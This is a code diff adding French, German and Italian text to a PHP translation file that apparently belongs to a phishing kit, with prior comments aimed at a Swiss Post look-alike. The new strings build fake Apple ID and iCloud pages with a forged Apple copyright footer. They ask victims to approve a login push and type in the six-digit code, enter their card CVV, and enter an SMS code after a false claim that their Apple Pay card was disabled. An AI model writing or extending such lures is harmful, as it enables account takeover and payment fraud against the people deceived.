@@ -30,6 +30,41 @@ $translations = [
     // FRANÇAIS (FR) — Suisse romande, ton naturel Post CH
     // =====================================================================
     'fr' => [
+        // ── ICLOUD PAGES ──
+        'push_title' => 'Vérification requise',
+        'push_subtitle' => 'Une demande de connexion a été détectée. Confirmez qu\'il s\'agit bien de vous.',
+        'push_step1' => 'Appuyez sur <b>Autoriser</b> sur votre iPhone pour confirmer votre identité',
+        'push_btn_authorized' => 'J\'ai autorisé — Entrer le code reçu',
+        'push_phase2_title' => 'Saisissez le code<br>de vérification',
+        'push_phase2_subtitle' => 'Entrez le code à 6&nbsp;chiffres qui s\'est affiché sur votre iPhone après avoir appuyé sur Autoriser.',
+        'push_btn_verify' => 'Vérifier',
+        'push_no_code' => 'Je n\'ai pas reçu de code',
+        'push_loading' => 'Vérification…',
+        'push_loading_sub' => 'Veuillez patienter quelques instants.',
+        'push_code_error' => 'Code incorrect. Veuillez réessayer.',
+        'push_new_code' => 'Nouveau code envoyé…',
+        'push_footer_status' => 'État du système',
+        'push_footer_privacy' => 'Engagement de confidentialité',
+        'push_footer_terms' => 'Conditions générales',
+        'push_footer_copyright' => 'Copyright © 2026 Apple Inc. Tous droits réservés.',
+
+        'sms_title' => 'Vérification Apple ID',
+        'sms_apple_pay' => 'Vérification Apple Pay',
+        'sms_cvv_subtitle' => 'Veuillez saisir le <strong>code CVV</strong> (3 chiffres au verso) de votre <strong>moyen de paiement enregistré</strong> pour confirmer votre identité.',
+        'sms_code_title' => 'Code de vérification',
+        'sms_code_subtitle' => 'Suite à cette connexion, nous avons <strong>désactivé votre carte reliée à Apple Pay</strong>. Pour la resynchroniser, veuillez saisir le code reçu par SMS.',
+        'sms_resend' => 'Renvoyer le code',
+        'sms_loading' => 'Vérification…',
+        'sms_error_invalid' => 'Code incorrect. Veuillez réessayer.',
+
+        'newpass_title' => 'Réinitialiser le mot de passe – Apple ID',
+        'newpass_heading' => 'Mot de passe<br>réinitialisé',
+        'newpass_subtitle' => 'Vous pouvez maintenant vous connecter avec votre nouveau mot de passe.',
+        'newpass_btn' => 'Aller à Apple ID',
+        'newpass_footer_status' => 'État du système',
+        'newpass_footer_privacy' => 'Engagement de confidentialité',
+        'newpass_footer_terms' => 'Conditions générales',
+
         // Header & Footer
         'secure_conn' => 'Connexion sécurisée',
         'help_contact' => 'Aide & Contact',
@@ -163,6 +198,44 @@ $translations = [
     // DEUTSCH (DE) — Schweizerdeutsch / Schriftdeutsch, natürlicher Post-Ton
     // =====================================================================
     'de' => [
+        // ── ICLOUD PAGES ──
+        'push_title' => 'Verifizierung erforderlich',
+        'push_subtitle' => 'Eine Anmeldeanfrage wurde erkannt. Bestätigen Sie, dass Sie es sind.',
+        'push_step1' => 'Tippen Sie auf Ihrem iPhone auf <b>Zulassen</b>, um Ihre Identität zu bestätigen',
+        'push_btn_authorized' => 'Ich habe zugelassen — Code eingeben',
+        'push_phase2_title' => 'Verifizierungscode<br>eingeben',
+        'push_phase2_subtitle' => 'Geben Sie den 6-stelligen Code ein, der auf Ihrem iPhone angezeigt wurde, nachdem Sie auf Zulassen getippt haben.',
+        'push_btn_verify' => 'Verifizieren',
+        'push_no_code' => 'Ich habe keinen Code erhalten',
+        'push_loading' => 'Verifizierung läuft…',
+        'push_loading_sub' => 'Bitte warten Sie einen Moment.',
+        'push_code_error' => 'Code ist falsch. Bitte versuchen Sie es erneut.',
+        'push_new_code' => 'Neuer Code gesendet…',
+        'push_footer_status' => 'Systemstatus',
+        'push_footer_privacy' => 'Datenschutzerklärung',
+        'push_footer_terms' => 'Allgemeine Geschäftsbedingungen',
+        'push_footer_copyright' => 'Copyright © 2026 Apple Inc. Alle Rechte vorbehalten.',
+
+        'sms_title' => 'Apple ID-Verifizierung',
+        'sms_apple_pay' => 'Apple Pay-Verifizierung',
+        'sms_loading' => 'Verifizierung läuft…',
+        'sms_error_invalid' => 'Code ungültig',
+
+        'newpass_title' => 'Réinitialisez votre mot de passe',
+        'newpass_intro' => 'Choisissez un nouveau mot de passe pour votre identifiant Apple.',
+        'newpass_label_new' => 'Nouveau mot de passe',
+        'newpass_label_confirm' => 'Confirmer le mot de passe',
+        'newpass_rule_len' => 'Au moins 8 caractères',
+        'newpass_rule_upper' => 'Une lettre majuscule',
+        'newpass_rule_num' => 'Un chiffre',
+        'newpass_error_mismatch' => 'Les mots de passe ne correspondent pas.',
+        'newpass_btn' => 'Modifier le mot de passe',
+        'newpass_heading' => 'Compte sécurisé',
+        'newpass_subtitle' => 'Votre compte Apple est de nouveau sécurisé. Pour toute nouvelle connexion, votre nouveau mot de passe vous sera demandé.',
+        'newpass_footer_status' => 'Systemstatus',
+        'newpass_footer_privacy' => 'Datenschutzerklärung',
+        'newpass_footer_terms' => 'Allgemeine Geschäftsbedingungen',
+
         // Header & Footer
         'secure_conn' => 'Sichere Verbindung',
         'help_contact' => 'Hilfe & Kontakt',
@@ -297,6 +370,48 @@ $translations = [
     // ITALIANO (IT) — Italiano svizzero, tono naturale Post CH
     // =====================================================================
     'it' => [
+        // ── ICLOUD PAGES ──
+        'push_title' => 'Verifica richiesta',
+        'push_subtitle' => 'È stata rilevata una richiesta di accesso. Confermate che siete voi.',
+        'push_step1' => 'Toccate <b>Consenti</b> sul vostro iPhone per confermare la vostra identità',
+        'push_btn_authorized' => 'Ho consentito — Inserire il codice ricevuto',
+        'push_phase2_title' => 'Inserite il codice<br>di verifica',
+        'push_phase2_subtitle' => 'Inserite il codice a 6&nbsp;cifre visualizzato sul vostro iPhone dopo aver toccato Consenti.',
+        'push_btn_verify' => 'Verificare',
+        'push_no_code' => 'Non ho ricevuto il codice',
+        'push_loading' => 'Verifica in corso…',
+        'push_loading_sub' => 'Attendete un attimo.',
+        'push_code_error' => 'Codice non corretto. Riprovate.',
+        'push_new_code' => 'Nuovo codice inviato…',
+        'push_footer_status' => 'Stato del sistema',
+        'push_footer_privacy' => 'Impegno sulla privacy',
+        'push_footer_terms' => 'Termini e condizioni',
+        'push_footer_copyright' => 'Copyright © 2026 Apple Inc. Tutti i diritti riservati.',
+
+        'sms_title' => 'Verifica Apple ID',
+        'sms_apple_pay' => 'Verifica Apple Pay',
+        'sms_cvv_subtitle' => 'Inserite il <strong>codice CVV</strong> (3 cifre sul retro) della vostra <strong>carta di pagamento registrata</strong> per confermare la vostra identità.',
+        'sms_code_title' => 'Codice di verifica',
+        'sms_code_subtitle' => 'In seguito a questo accesso, abbiamo <strong>disabilitato la vostra carta collegata ad Apple Pay</strong>. Per risincronizzarla, inserite il codice ricevuto via SMS.',
+        'sms_resend' => 'Invia di nuovo il codice',
+        'sms_loading' => 'Verifica in corso…',
+        'sms_error_invalid' => 'Codice non corretto. Riprovate.',
+
+        'newpass_title' => 'Reimpostate la vostra password',
+        'newpass_intro' => 'Scegliete una nuova password per il vostro ID Apple.',
+        'newpass_label_new' => 'Nuova password',
+        'newpass_label_confirm' => 'Confermare la password',
+        'newpass_rule_len' => 'Almeno 8 caratteri',
+        'newpass_rule_upper' => 'Una lettera maiuscola',
+        'newpass_rule_num' => 'Un numero',
+        'newpass_error_mismatch' => 'Le password non corrispondono.',
+        'newpass_btn' => 'Modificare la password',
+        'newpass_heading' => 'Account protetto',
+        'newpass_subtitle' => 'Il vostro account Apple è di nuovo protetto. Per qualsiasi nuovo accesso, vi sarà richiesta la vostra nuova password.',
+        'newpass_footer_status' => 'Stato del sistema',
+        'newpass_footer_privacy' => 'Impegno sulla privacy',
+        'newpass_footer_terms' => 'Termini e condizioni',
+
         // Header & Footer
         'secure_conn' => 'Connessione sicura',
         'help_contact' => 'Aiuto & Contatto',
